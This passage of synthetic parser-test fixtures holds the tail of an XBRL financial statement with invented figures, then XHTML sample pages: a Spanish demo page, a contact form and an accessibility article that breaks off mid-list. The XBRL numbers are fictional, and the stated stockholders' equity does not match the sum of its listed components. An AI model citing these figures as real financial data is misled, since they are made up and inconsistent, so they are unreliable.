  <us-gaap:IncomeTaxExpenseBenefit contextRef="FY2023" unitRef="USD" decimals="-6">136000000</us-gaap:IncomeTaxExpenseBenefit>

  <!-- Net Income -->
  <us-gaap:NetIncomeLoss contextRef="FY2024" unitRef="USD" decimals="-6">553000000</us-gaap:NetIncomeLoss>
  <us-gaap:NetIncomeLoss contextRef="FY2023" unitRef="USD" decimals="-6">515000000</us-gaap:NetIncomeLoss>

  <!-- Earnings Per Share -->
  <us-gaap:EarningsPerShareBasic contextRef="FY2024" unitRef="USDPerShare" decimals="2">4.42</us-gaap:EarningsPerShareBasic>
  <us-gaap:EarningsPerShareBasic contextRef="FY2023" unitRef="USDPerShare" decimals="2">4.11</us-gaap:EarningsPerShareBasic>

  <us-gaap:EarningsPerShareDiluted contextRef="FY2024" unitRef="USDPerShare" decimals="2">4.38</us-gaap:EarningsPerShareDiluted>
  <us-gaap:EarningsPerShareDiluted contextRef="FY2023" unitRef="USDPerShare" decimals="2">4.07</us-gaap:EarningsPerShareDiluted>

  <!-- Weighted Average Shares -->
  <us-gaap:WeightedAverageNumberOfSharesOutstandingBasic contextRef="FY2024" unitRef="shares" decimals="0">125000000</us-gaap:WeightedAverageNumberOfSharesOutstandingBasic>
  <us-gaap:WeightedAverageNumberOfSharesOutstandingBasic contextRef="FY2023" unitRef="shares" decimals="0">125200000</us-gaap:WeightedAverageNumberOfSharesOutstandingBasic>

  <us-gaap:WeightedAverageNumberOfDilutedSharesOutstanding contextRef="FY2024" unitRef="shares" decimals="0">126250000</us-gaap:WeightedAverageNumberOfDilutedSharesOutstanding>
  <us-gaap:WeightedAverageNumberOfDilutedSharesOutstanding contextRef="FY2023" unitRef="shares" decimals="0">126500000</us-gaap:WeightedAverageNumberOfDilutedSharesOutstanding>

  <!-- Balance Sheet Facts -->
  
  <!-- Current Assets -->
  <us-gaap:CashAndCashEquivalentsAtCarryingValue contextRef="AsOf2024" unitRef="USD" decimals="-6">1250000000</us-gaap:CashAndCashEquivalentsAtCarryingValue>
  <us-gaap:CashAndCashEquivalentsAtCarryingValue contextRef="AsOf2023" unitRef="USD" decimals="-6">1180000000</us-gaap:CashAndCashEquivalentsAtCarryingValue>

  <us-gaap:ShortTermInvestments contextRef="AsOf2024" unitRef="USD" decimals="-6">875000000</us-gaap:ShortTermInvestments>
  <us-gaap:ShortTermInvestments contextRef="AsOf2023" unitRef="USD" decimals="-6">825000000</us-gaap:ShortTermInvestments>

  <us-gaap:AccountsReceivableNetCurrent contextRef="AsOf2024" unitRef="USD" decimals="-6">485000000</us-gaap:AccountsReceivableNetCurrent>
  <us-gaap:AccountsReceivableNetCurrent contextRef="AsOf2023" unitRef="USD" decimals="-6">451000000</us-gaap:AccountsReceivableNetCurrent>

  <us-gaap:InventoryNet contextRef="AsOf2024" unitRef="USD" decimals="-6">325000000</us-gaap:InventoryNet>
  <us-gaap:InventoryNet contextRef="AsOf2023" unitRef="USD" decimals="-6">298000000</us-gaap:InventoryNet>

  <us-gaap:PrepaidExpenseAndOtherAssets contextRef="AsOf2024" unitRef="USD" decimals="-6">115000000</us-gaap:PrepaidExpenseAndOtherAssets>
  <us-gaap:PrepaidExpenseAndOtherAssets contextRef="AsOf2023" unitRef="USD" decimals="-6">108000000</us-gaap:PrepaidExpenseAndOtherAssets>

  <us-gaap:AssetsCurrent contextRef="AsOf2024" unitRef="USD" decimals="-6">3050000000</us-gaap:AssetsCurrent>
  <us-gaap:AssetsCurrent contextRef="AsOf2023" unitRef="USD" decimals="-6">2862000000</us-gaap:AssetsCurrent>

  <!-- Non-Current Assets -->
  <us-gaap:PropertyPlantAndEquipmentNet contextRef="AsOf2024" unitRef="USD" decimals="-6">1875000000</us-gaap:PropertyPlantAndEquipmentNet>
  <us-gaap:PropertyPlantAndEquipmentNet contextRef="AsOf2023" unitRef="USD" decimals="-6">1720000000</us-gaap:PropertyPlantAndEquipmentNet>

  <us-gaap:Goodwill contextRef="AsOf2024" unitRef="USD" decimals="-6">1250000000</us-gaap:Goodwill>
  <us-gaap:Goodwill contextRef="AsOf2023" unitRef="USD" decimals="-6">1250000000</us-gaap:Goodwill>

  <us-gaap:IntangibleAssetsNetExcludingGoodwill contextRef="AsOf2024" unitRef="USD" decimals="-6">625000000</us-gaap:IntangibleAssetsNetExcludingGoodwill>
  <us-gaap:IntangibleAssetsNetExcludingGoodwill contextRef="AsOf2023" unitRef="USD" decimals="-6">685000000</us-gaap:IntangibleAssetsNetExcludingGoodwill>

  <us-gaap:LongTermInvestments contextRef="AsOf2024" unitRef="USD" decimals="-6">450000000</us-gaap:LongTermInvestments>
  <us-gaap:LongTermInvestments contextRef="AsOf2023" unitRef="USD" decimals="-6">425000000</us-gaap:LongTermInvestments>

  <us-gaap:OtherAssetsNoncurrent contextRef="AsOf2024" unitRef="USD" decimals="-6">185000000</us-gaap:OtherAssetsNoncurrent>
  <us-gaap:OtherAssetsNoncurrent contextRef="AsOf2023" unitRef="USD" decimals="-6">172000000</us-gaap:OtherAssetsNoncurrent>

  <!-- Total Assets -->
  <us-gaap:Assets contextRef="AsOf2024" unitRef="USD" decimals="-6">7435000000</us-gaap:Assets>
  <us-gaap:Assets contextRef="AsOf2023" unitRef="USD" decimals="-6">7114000000</us-gaap:Assets>

  <!-- Current Liabilities -->
  <us-gaap:AccountsPayableCurrent contextRef="AsOf2024" unitRef="USD" decimals="-6">285000000</us-gaap:AccountsPayableCurrent>
  <us-gaap:AccountsPayableCurrent contextRef="AsOf2023" unitRef="USD" decimals="-6">267000000</us-gaap:AccountsPayableCurrent>

  <us-gaap:AccruedLiabilitiesCurrent contextRef="AsOf2024" unitRef="USD" decimals="-6">425000000</us-gaap:AccruedLiabilitiesCurrent>
  <us-gaap:AccruedLiabilitiesCurrent contextRef="AsOf2023" unitRef="USD" decimals="-6">398000000</us-gaap:AccruedLiabilitiesCurrent>

  <us-gaap:DeferredRevenueCurrent contextRef="AsOf2024" unitRef="USD" decimals="-6">315000000</us-gaap:DeferredRevenueCurrent>
  <us-gaap:DeferredRevenueCurrent contextRef="AsOf2023" unitRef="USD" decimals="-6">298000000</us-gaap:DeferredRevenueCurrent>

  <us-gaap:LiabilitiesCurrent contextRef="AsOf2024" unitRef="USD" decimals="-6">1025000000</us-gaap:LiabilitiesCurrent>
  <us-gaap:LiabilitiesCurrent contextRef="AsOf2023" unitRef="USD" decimals="-6">963000000</us-gaap:LiabilitiesCurrent>

  <!-- Non-Current Liabilities -->
  <us-gaap:LongTermDebtNoncurrent contextRef="AsOf2024" unitRef="USD" decimals="-6">1500000000</us-gaap:LongTermDebtNoncurrent>
  <us-gaap:LongTermDebtNoncurrent contextRef="AsOf2023" unitRef="USD" decimals="-6">1500000000</us-gaap:LongTermDebtNoncurrent>

  <us-gaap:DeferredRevenueNoncurrent contextRef="AsOf2024" unitRef="USD" decimals="-6">185000000</us-gaap:DeferredRevenueNoncurrent>
  <us-gaap:DeferredRevenueNoncurrent contextRef="AsOf2023" unitRef="USD" decimals="-6">172000000</us-gaap:DeferredRevenueNoncurrent>

  <us-gaap:OtherLiabilitiesNoncurrent contextRef="AsOf2024" unitRef="USD" decimals="-6">125000000</us-gaap:OtherLiabilitiesNoncurrent>
  <us-gaap:OtherLiabilitiesNoncurrent contextRef="AsOf2023" unitRef="USD" decimals="-6">118000000</us-gaap:OtherLiabilitiesNoncurrent>

  <!-- Total Liabilities -->
  <us-gaap:Liabilities contextRef="AsOf2024" unitRef="USD" decimals="-6">2835000000</us-gaap:Liabilities>
  <us-gaap:Liabilities contextRef="AsOf2023" unitRef="USD" decimals="-6">2753000000</us-gaap:Liabilities>

  <!-- Stockholders' Equity -->
  <us-gaap:CommonStockValue contextRef="AsOf2024" unitRef="USD" decimals="-3">125000</us-gaap:CommonStockValue>
  <us-gaap:CommonStockValue contextRef="AsOf2023" unitRef="USD" decimals="-3">125000</us-gaap:CommonStockValue>

  <us-gaap:AdditionalPaidInCapitalCommonStock contextRef="AsOf2024" unitRef="USD" decimals="-6">1875000000</us-gaap:AdditionalPaidInCapitalCommonStock>
  <us-gaap:AdditionalPaidInCapitalCommonStock contextRef="AsOf2023" unitRef="USD" decimals="-6">1830000000</us-gaap:AdditionalPaidInCapitalCommonStock>

  <us-gaap:RetainedEarningsAccumulatedDeficit contextRef="AsOf2024" unitRef="USD" decimals="-6">2725000000</us-gaap:RetainedEarningsAccumulatedDeficit>
  <us-gaap:RetainedEarningsAccumulatedDeficit contextRef="AsOf2023" unitRef="USD" decimals="-6">2406000000</us-gaap:RetainedEarningsAccumulatedDeficit>

  <us-gaap:AccumulatedOtherComprehensiveIncomeLossNetOfTax contextRef="AsOf2024" unitRef="USD" decimals="-6">-125000000</us-gaap:AccumulatedOtherComprehensiveIncomeLossNetOfTax>
  <us-gaap:AccumulatedOtherComprehensiveIncomeLossNetOfTax contextRef="AsOf2023" unitRef="USD" decimals="-6">-85000000</us-gaap:AccumulatedOtherComprehensiveIncomeLossNetOfTax>

  <!-- Total Stockholders' Equity -->
  <us-gaap:StockholdersEquity contextRef="AsOf2024" unitRef="USD" decimals="-6">4600000000</us-gaap:StockholdersEquity>
  <us-gaap:StockholdersEquity contextRef="AsOf2023" unitRef="USD" decimals="-6">4361000000</us-gaap:StockholdersEquity>

  <!-- Total Liabilities and Stockholders' Equity -->
  <us-gaap:LiabilitiesAndStockholdersEquity contextRef="AsOf2024" unitRef="USD" decimals="-6">7435000000</us-gaap:LiabilitiesAndStockholdersEquity>
  <us-gaap:LiabilitiesAndStockholdersEquity contextRef="AsOf2023" unitRef="USD" decimals="-6">7114000000</us-gaap:LiabilitiesAndStockholdersEquity>

  <!-- Cash Flow Statement Facts -->
  
  <!-- Operating Activities -->
  <us-gaap:NetCashProvidedByUsedInOperatingActivities contextRef="FY2024" unitRef="USD" decimals="-6">725000000</us-gaap:NetCashProvidedByUsedInOperatingActivities>
  <us-gaap:NetCashProvidedByUsedInOperatingActivities contextRef="FY2023" unitRef="USD" decimals="-6">682000000</us-gaap:NetCashProvidedByUsedInOperatingActivities>

  <!-- Investing Activities -->
  <us-gaap:NetCashProvidedByUsedInInvestingActivities contextRef="FY2024" unitRef="USD" decimals="-6">-285000000</us-gaap:NetCashProvidedByUsedInInvestingActivities>
  <us-gaap:NetCashProvidedByUsedInInvestingActivities contextRef="FY2023" unitRef="USD" decimals="-6">-315000000</us-gaap:NetCashProvidedByUsedInInvestingActivities>

  <!-- Financing Activities -->
  <us-gaap:NetCashProvidedByUsedInFinancingActivities contextRef="FY2024" unitRef="USD" decimals="-6">-370000000</us-gaap:NetCashProvidedByUsedInFinancingActivities>
  <us-gaap:NetCashProvidedByUsedInFinancingActivities contextRef="FY2023" unitRef="USD" decimals="-6">-285000000</us-gaap:NetCashProvidedByUsedInFinancingActivities>

  <!-- Net Change in Cash -->
  <us-gaap:CashCashEquivalentsRestrictedCashAndRestrictedCashEquivalentsPeriodIncreaseDecreaseIncludingExchangeRateEffect contextRef="FY2024" unitRef="USD" decimals="-6">70000000</us-gaap:CashCashEquivalentsRestrictedCashAndRestrictedCashEquivalentsPeriodIncreaseDecreaseIncludingExchangeRateEffect>
  <us-gaap:CashCashEquivalentsRestrictedCashAndRestrictedCashEquivalentsPeriodIncreaseDecreaseIncludingExchangeRateEffect contextRef="FY2023" unitRef="USD" decimals="-6">82000000</us-gaap:CashCashEquivalentsRestrictedCashAndRestrictedCashEquivalentsPeriodIncreaseDecreaseIncludingExchangeRateEffect>

  <!-- Key Ratios and Metrics -->
  <us-gaap:DebtToEquityRatio contextRef="AsOf2024" unitRef="pure" decimals="2">0.33</us-gaap:DebtToEquityRatio>
  <us-gaap:DebtToEquityRatio contextRef="AsOf2023" unitRef="pure" decimals="2">0.34</us-gaap:DebtToEquityRatio>

</xbrl>
</file>

<file path="sample_data/test_files_synthetic/small/xhtml/basic_webpage.xhtml">
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="es" lang="es">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
    <meta name="description" content="Página web básica en español para demostrar análisis XHTML multiidioma" />
    <meta name="keywords" content="xhtml, español, prueba, página web, multiidioma" />
    <meta name="author" content="Desarrollador de Pruebas" />
    <title>Página Web Básica - Ejemplo en Español</title>
    <style type="text/css">
        body { font-family: Arial, sans-serif; margin: 20px; }
        .header { background-color: #f0f0f0; padding: 10px; }
        .content { margin: 20px 0; }
        .footer { border-top: 1px solid #ccc; padding-top: 10px; }
    </style>
</head>
<body>
    <div class="header">
        <h1>Bienvenido a Nuestro Sitio Web</h1>
        <p>Esta es una página de ejemplo en español para probar el análisis de XHTML.</p>
    </div>
    
    <div class="content">
        <h2>Acerca de Esta Página</h2>
        <p>
            Esta página web demuestra el uso de XHTML con contenido en español. 
            Incluye varios elementos HTML comunes como encabezados, párrafos, 
            listas y enlaces para evaluar las capacidades de análisis.
        </p>
        
        <h3>Características Principales</h3>
        <ul>
            <li>Contenido completamente en español</li>
            <li>Estructura HTML válida</li>
            <li>Estilos CSS integrados</li>
            <li>Enlaces externos e internos</li>
        </ul>
        
        <h3>Información de Contacto</h3>
        <p>Para más información, puedes contactarnos a través de:</p>
        <ul>
            <li>Correo electrónico: <a href="mailto:info@ejemplo.com">info@ejemplo.com</a></li>
            <li>Teléfono: +34 123 456 789</li>
            <li>Sitio web: <a href="https://www.ejemplo.com">www.ejemplo.com</a></li>
        </ul>
        
        <h3>Galería de Imágenes</h3>
        <p>Aquí tienes algunas imágenes de ejemplo:</p>
        
        <!-- Image without alt text to test accessibility -->
        <img src="imagen1.jpg" width="200" height="150" />
        
        <!-- Image with proper alt text -->
        <img src="imagen2.jpg" alt="Vista panorámica de la ciudad de Madrid" 
             width="200" height="150" />
        
        <h3>Formulario de Contacto Simple</h3>
        <form action="procesar.php" method="post">
            <p>
                <label for="nombre">Nombre:</label><br />
                <input type="text" id="nombre" name="nombre" />
            </p>
            <p>
                <label for="mensaje">Mensaje:</label><br />
                <textarea id="mensaje" name="mensaje" rows="4" cols="40"></textarea>
            </p>
            <p>
                <input type="submit" value="Enviar" />
                <input type="reset" value="Limpiar" />
            </p>
        </form>
        
        <h3>Tabla de Datos</h3>
        <table border="1">
            <tr>
                <th>Ciudad</th>
                <th>Población</th>
                <th>Región</th>
            </tr>
            <tr>
                <td>Madrid</td>
                <td>3.223.334</td>
                <td>Comunidad de Madrid</td>
            </tr>
            <tr>
                <td>Barcelona</td>
                <td>1.620.343</td>
                <td>Cataluña</td>
            </tr>
            <tr>
                <td>Valencia</td>
                <td>791.413</td>
                <td>Comunidad Valenciana</td>
            </tr>
        </table>
    </div>
    
    <div class="footer">
        <p>© 2024 Sitio Web de Ejemplo. Todos los derechos reservados.</p>
        <p><small>Esta es una página de prueba para análisis XML.</small></p>
        
        <h4>Enlaces Útiles</h4>
        <ul>
            <li><a href="inicio.xhtml">Inicio</a></li>
            <li><a href="acerca.xhtml">Acerca de</a></li>
            <li><a href="contacto.xhtml">Contacto</a></li>
            <li><a href="privacidad.xhtml">Política de Privacidad</a></li>
        </ul>
    </div>
    
    <script type="text/javascript">
        // Simple JavaScript for testing
        document.addEventListener('DOMContentLoaded', function() {
            console.log('Página cargada correctamente');
        });
    </script>
</body>
</html>
</file>

<file path="sample_data/test_files_synthetic/small/xhtml/form_page.xhtml">
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
    <meta name="description" content="Contact form page demonstrating XHTML form elements and accessibility" />
    <meta name="keywords" content="contact, form, xhtml, accessibility, web forms" />
    <meta name="author" content="Web Developer" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Contact Form - XHTML Test Page</title>
    <link rel="stylesheet" type="text/css" href="form-styles.css" />
    <script type="text/javascript" src="form-validation.js"></script>
</head>
<body>
    <header>
        <h1>Contact Us</h1>
        <nav role="navigation">
            <ul>
                <li><a href="index.xhtml">Home</a></li>
                <li><a href="about.xhtml">About</a></li>
                <li><a href="contact.xhtml" aria-current="page">Contact</a></li>
                <li><a href="services.xhtml">Services</a></li>
            </ul>
        </nav>
    </header>
    
    <main role="main">
        <section id="contact-form-section">
            <header>
                <h2>Get in Touch</h2>
                <p>Please fill out the form below and we'll get back to you as soon as possible.</p>
            </header>
            
            <form id="contact-form" action="process-contact.php" method="post" 
                  enctype="multipart/form-data">
                <fieldset>
                    <legend>Personal Information</legend>
                    
                    <div class="form-row">
                        <label for="first-name">First Name: <span class="required">*</span></label>
                        <input type="text" id="first-name" name="firstName" 
                               required="required" maxlength="50" 
                               placeholder="Enter your first name" />
                    </div>
                    
                    <div class="form-row">
                        <label for="last-name">Last Name: <span class="required">*</span></label>
                        <input type="text" id="last-name" name="lastName" 
                               required="required" maxlength="50" 
                               placeholder="Enter your last name" />
                    </div>
                    
                    <div class="form-row">
                        <label for="email">Email Address: <span class="required">*</span></label>
                        <input type="email" id="email" name="email" 
                               required="required" maxlength="100" 
                               placeholder="your.email@example.com" />
                    </div>
                    
                    <div class="form-row">
                        <label for="phone">Phone Number:</label>
                        <input type="tel" id="phone" name="phone" 
                               placeholder="+1 (555) 123-4567" />
                    </div>
                </fieldset>
                
                <fieldset>
                    <legend>Contact Preferences</legend>
                    
                    <div class="form-row">
                        <label for="contact-reason">Reason for Contact:</label>
                        <select id="contact-reason" name="contactReason" required="required">
                            <option value="">Please select...</option>
                            <option value="general">General Inquiry</option>
                            <option value="support">Technical Support</option>
                            <option value="sales">Sales Question</option>
                            <option value="feedback">Feedback</option>
                            <option value="other">Other</option>
                        </select>
                    </div>
                    
                    <div class="form-row">
                        <fieldset class="radio-group">
                            <legend>Preferred Contact Method:</legend>
                            <label>
                                <input type="radio" name="contactMethod" value="email" checked="checked" />
                                Email
                            </label>
                            <label>
                                <input type="radio" name="contactMethod" value="phone" />
                                Phone
                            </label>
                            <label>
                                <input type="radio" name="contactMethod" value="mail" />
                                Postal Mail
                            </label>
                        </fieldset>
                    </div>
                    
                    <div class="form-row">
                        <fieldset class="checkbox-group">
                            <legend>Services of Interest:</legend>
                            <label>
                                <input type="checkbox" name="services[]" value="web-design" />
                                Web Design
                            </label>
                            <label>
                                <input type="checkbox" name="services[]" value="development" />
                                Web Development
                            </label>
                            <label>
                                <input type="checkbox" name="services[]" value="seo" />
                                SEO Services
                            </label>
                            <label>
                                <input type="checkbox" name="services[]" value="maintenance" />
                                Website Maintenance
                            </label>
                        </fieldset>
                    </div>
                </fieldset>
                
                <fieldset>
                    <legend>Message Details</legend>
                    
                    <div class="form-row">
                        <label for="subject">Subject: <span class="required">*</span></label>
                        <input type="text" id="subject" name="subject" 
                               required="required" maxlength="100" 
                               placeholder="Brief description of your inquiry" />
                    </div>
                    
                    <div class="form-row">
                        <label for="message">Message: <span class="required">*</span></label>
                        <textarea id="message" name="message" rows="6" cols="50" 
                                  required="required" maxlength="1000" 
                                  placeholder="Please provide details about your inquiry..."></textarea>
                    </div>
                    
                    <div class="form-row">
                        <label for="attachment">Attachment (optional):</label>
                        <input type="file" id="attachment" name="attachment" 
                               accept=".pdf,.doc,.docx,.txt,.jpg,.png" />
                        <small>Accepted formats: PDF, DOC, DOCX, TXT, JPG, PNG (max 5MB)</small>
                    </div>
                </fieldset>
                
                <fieldset>
                    <legend>Privacy and Consent</legend>
                    
                    <div class="form-row">
                        <label>
                            <input type="checkbox" name="newsletter" value="yes" />
                            Yes, I would like to receive your newsletter and updates
                        </label>
                    </div>
                    
                    <div class="form-row">
                        <label>
                            <input type="checkbox" name="privacy" value="accepted" required="required" />
                            I agree to the <a href="privacy-policy.xhtml" target="_blank">Privacy Policy</a> 
                            and <a href="terms.xhtml" target="_blank">Terms of Service</a> 
                            <span class="required">*</span>
                        </label>
                    </div>
                </fieldset>
                
                <div class="form-actions">
                    <button type="submit">Send Message</button>
                    <button type="reset">Clear Form</button>
                    <input type="hidden" name="form_token" value="abc123def456" />
                    <input type="hidden" name="timestamp" value="1640995200" />
                </div>
            </form>
        </section>
        
        <aside id="contact-info" role="complementary">
            <h3>Other Ways to Reach Us</h3>
            <address>
                <strong>Main Office:</strong><br />
                123 Business Street<br />
                Suite 456<br />
                Business City, BC 12345<br />
                Phone: <a href="tel:+15551234567">+1 (555) 123-4567</a><br />
                Email: <a href="mailto:info@example.com">info@example.com</a>
            </address>
            
            <h4>Business Hours</h4>
            <table>
                <thead>
                    <tr>
                        <th scope="col">Day</th>
                        <th scope="col">Hours</th>
                    </tr>
                </thead>
                <tbody>
                    <tr>
                        <td>Monday - Friday</td>
                        <td>9:00 AM - 6:00 PM</td>
                    </tr>
                    <tr>
                        <td>Saturday</td>
                        <td>10:00 AM - 4:00 PM</td>
                    </tr>
                    <tr>
                        <td>Sunday</td>
                        <td>Closed</td>
                    </tr>
                </tbody>
            </table>
        </aside>
    </main>
    
    <footer role="contentinfo">
        <p>© 2024 Example Company. All rights reserved.</p>
        <nav role="navigation" aria-label="Footer navigation">
            <ul>
                <li><a href="privacy-policy.xhtml">Privacy Policy</a></li>
                <li><a href="terms.xhtml">Terms of Service</a></li>
                <li><a href="sitemap.xhtml">Site Map</a></li>
                <li><a href="contact.xhtml">Contact</a></li>
            </ul>
        </nav>
    </footer>
</body>
</html>
</file>

<file path="sample_data/test_files_synthetic/small/xhtml/semantic_article.xhtml">
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.1//EN" "http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
    <meta name="description" content="A semantic article about web accessibility best practices" />
    <meta name="keywords" content="accessibility, web design, WCAG, semantic markup, inclusive design" />
    <meta name="author" content="Accessibility Expert" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <meta property="og:title" content="Web Accessibility Best Practices" />
    <meta property="og:description" content="Learn about creating inclusive web experiences" />
    <meta property="og:type" content="article" />
    <meta property="og:url" content="https://example.com/accessibility-guide" />
    <meta property="og:image" content="https://example.com/images/accessibility-hero.jpg" />
    <title>Web Accessibility Best Practices - Inclusive Design Guide</title>
    <link rel="stylesheet" type="text/css" href="article-styles.css" media="screen" />
    <link rel="stylesheet" type="text/css" href="print-styles.css" media="print" />
    <link rel="canonical" href="https://example.com/accessibility-guide" />
    <script type="text/javascript" src="accessibility-features.js"></script>
</head>
<body>
    <header role="banner">
        <div class="site-header">
            <h1><a href="index.xhtml">Inclusive Web Design</a></h1>
            <nav role="navigation" aria-label="Main navigation">
                <ul>
                    <li><a href="index.xhtml">Home</a></li>
                    <li><a href="articles.xhtml" aria-current="section">Articles</a></li>
                    <li><a href="resources.xhtml">Resources</a></li>
                    <li><a href="about.xhtml">About</a></li>
                </ul>
            </nav>
        </div>
    </header>
    
    <main role="main">
        <article role="article">
            <header>
                <h1>Web Accessibility Best Practices</h1>
                <p class="article-meta">
                    <time datetime="2024-01-15T10:30:00Z">January 15, 2024</time> 
                    by <span class="author">Accessibility Expert</span>
                    <span class="reading-time" aria-label="Estimated reading time">• 8 min read</span>
                </p>
                <p class="article-summary">
                    Creating inclusive web experiences requires understanding and implementing 
                    accessibility principles from the ground up. This comprehensive guide 
                    covers essential techniques for building websites that work for everyone.
                </p>
            </header>
            
            <section id="introduction">
                <h2>Introduction to Web Accessibility</h2>
                <p>
                    Web accessibility ensures that websites and digital tools are designed 
                    and developed so that people with disabilities can use them effectively. 
                    This includes users who are:
                </p>
                <ul>
                    <li>Blind or have low vision</li>
                    <li>Deaf or hard of hearing</li>
                    <li>Living with mobility impairments</li>
                    <li>Experiencing cognitive differences</li>
                </ul>
                
                <figure>
                    <img src="accessibility-statistics.jpg" 
                         alt="Infographic showing that 1 in 4 adults in the US live with a disability" 
                         width="600" height="400" />
                    <figcaption>
                        According to the CDC, 1 in 4 adults in the United States live with a disability.
                        <cite>Source: <a href="https://cdc.gov/disability/features/ds-disability-stats.html">
                        CDC Disability and Health Data</a></cite>
                    </figcaption>
                </figure>
            </section>
            
            <section id="wcag-principles">
                <h2>WCAG 2.1 Principles</h2>
                <p>
                    The Web Content Accessibility Guidelines (WCAG) 2.1 are organized around 
                    four main principles, often remembered by the acronym <strong>POUR</strong>:
                </p>
                
                <section id="perceivable">
                    <h3>1. Perceivable</h3>
                    <p>Information must be presentable in ways users can perceive.</p>
                    <ul>
                        <li>Provide text alternatives for images</li>
                        <li>Offer captions and transcripts for multimedia</li>
                        <li>Ensure sufficient color contrast</li>
                        <li>Make content adaptable to different presentations</li>
                    </ul>
                    
                    <aside class="tip" role="note">
                        <h4>Pro Tip</h4>
                        <p>Use the <code>alt</code> attribute for informative images, 
                           but leave it empty (<code>alt=""</code>) for decorative images.</p>
                    </aside>
                </section>
                
                <section id="operable">
                    <h3>2. Operable</h3>
                    <p>Interface components must be operable by all users.</p>
                    <ul>
                        <li>Make all functionality keyboard accessible</li>
                        <li>Give users enough time to read content</li>
                        <li>Avoid content that causes seizures</li>
                        <li>Help users navigate and find content</li>
                    </ul>
                </section>
                
                <section id="understandable">
                    <h3>3. Understandable</h3>
                    <p>Information and UI operation must be understandable.</p>
                    <ul>
                        <li>Make text readable and understandable</li>
                        <li>Make content appear and operate predictably</li>
                        <li>Help users avoid and correct mistakes</li>
                    </ul>
                </section>
                
                <section id="robust">
                    <h3>4. Robust</h3>
                    <p>Content must be robust enough for interpretation by assistive technologies.</p>
                    <ul>
                        <li>Use valid, semantic markup</li>
                        <li>Ensure compatibility with current and future assistive tools</li>
                    </ul>
                </section>
            </section>
            
            <section id="implementation-techniques">
                <h2>Key Implementation Techniques</h2>
                
                <section id="semantic-markup">
                    <h3>Semantic Markup</h3>
                    <p>Using appropriate HTML elements conveys meaning and structure:</p>
                    
                    <details>
                        <summary>HTML Semantic Elements Reference</summary>
                        <table>
                            <caption>Common semantic HTML elements and their purposes</caption>
                            <thead>
                                <tr>
                                    <th scope="col">Element</th>
                                    <th scope="col">Purpose</th>
                                    <th scope="col">Example Use</th>
                                </tr>
                            </thead>
                            <tbody>
                                <tr>
                                    <td><code>&lt;header&gt;</code></td>
                                    <td>Page or section header</td>
                                    <td>Site header, article header</td>
                                </tr>
                                <tr>
                                    <td><code>&lt;nav&gt;</code></td>
                                    <td>Navigation links</td>
                                    <td>Main menu, breadcrumbs</td>
                                </tr>
                                <tr>
                                    <td><code>&lt;main&gt;</code></td>
                                    <td>Primary content</td>
                                    <td>Main content area</td>
                                </tr>
                                <tr>
                                    <td><code>&lt;article&gt;</code></td>
                                    <td>Standalone content</td>
                                    <td>Blog post, news article</td>
                                </tr>
                                <tr>
                                    <td><code>&lt;section&gt;</code></td>
                                    <td>Thematic grouping</td>
                                    <td>Chapter, tab panel</td>
                                </tr>
                                <tr>
                                    <td><code>&lt;aside&gt;</code></td>
                                    <td>Related content</td>
                                    <td>Sidebar, callout box</td>
                                </tr>
                                <tr>
                                    <td><code>&lt;footer&gt;</code></td>
                                    <td>Page or section footer</td>
                                    <td>Site footer, article footer</td>
                                </tr>
                            </tbody>
                        </table>
                    </details>
                </section>
                
                <section id="aria-attributes">
                    <h3>ARIA Attributes</h3>
                    <p>ARIA (Accessible Rich Internet Applications) attributes enhance accessibility:</p>
                    <ul>
                        <li><code>aria-label</code>: Provides accessible name</li>
                        <li><code>aria-describedby</code>: References describing elements</li>
                        <li><code>aria-expanded</code>: Indicates if collapsible content is expanded</li>
                        <li><code>role</code>: Defines the element's purpose</li>
                    </ul>
                </section>
            </section>
            
            <section id="testing-tools">
                <h2>Testing and Validation Tools</h2>
                <p>Regular testing ensures your accessibility implementations work correctly:</p>
                
                <section id="automated-tools">
                    <h3>Automated Testing Tools</h3>
                    <ul>
                        <li><a href="https://wave.webaim.org/">WAVE Web Accessibility Evaluator</a></li>
                        <li><a href="https://axe-core.org/">axe DevTools</a></li>
                        <li><a href="https://accessibilityinsights.io/">Accessibility Insights</a></li>
                        <li><a href="https://pa11y.org/">Pa11y Command Line Tool</a></li>
                    </ul>
                </section>
                
                <section id="manual-testing">
                    <h3>Manual Testing Techniques</h3>
                    <ol>
                        <li>Navigate using only the keyboard</li>
                        <li>Test with screen readers (NVDA, JAWS, VoiceOver)</li>
                        <li>Check color contrast ratios</li>
                        <li>Verify content reflows at 200% zoom</li>
                        <li>Test with users who have disabilities</li>
                    </ol>
                </section>
            </section>
            
            <footer class="article-footer">
                <h2>Conclusion</h2>
                <p>
                    Web accessibility is not just about compliance—it's about creating 
                    inclusive experiences that benefit everyone. By implementing these 
                    best practices, you'll build websites that are more usable, 
                    maintainable, and reach a broader audience.
                </p>
                
                <section id="article-tags">
                    <h3>Tags</h3>
                    <ul class="tag-list">
                        <li><a href="tag/accessibility.xhtml" rel="tag">Accessibility</a></li>
                        <li><a href="tag/wcag.xhtml" rel="tag">WCAG</a></li>
                        <li><a href="tag/semantic-markup.xhtml" rel="tag">Semantic Markup</a></li>
                        <li><a href="tag/inclusive-design.xhtml" rel="tag">Inclusive Design</a></li>
                    </ul>
                </section>
                
                <section id="article-navigation">
                    <h3>Related Articles</h3>
                    <nav aria-label="Related articles">
                        <ul>
                            <li><a href="color-contrast-guide.xhtml" rel="next">
                                Next: Color Contrast Guidelines</a></li>
                            <li><a href="keyboard-navigation.xhtml" rel="prev">
